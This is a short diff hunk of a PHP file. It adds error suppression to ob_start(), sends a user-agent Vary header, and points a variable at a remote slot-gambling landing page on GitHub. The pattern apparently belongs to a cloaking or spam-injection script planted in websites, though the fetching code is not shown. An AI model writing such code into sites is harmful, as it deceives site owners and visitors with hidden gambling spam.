@@ -1,5 +1,5 @@
 <?php
-ob_start();
+@ob_start();
 header("Vary: U-Agent");
 
 $src = "https://raw.githubusercontent.com/waklabu979/landing-rokokslot/refs/heads/main/revisiidea.html";
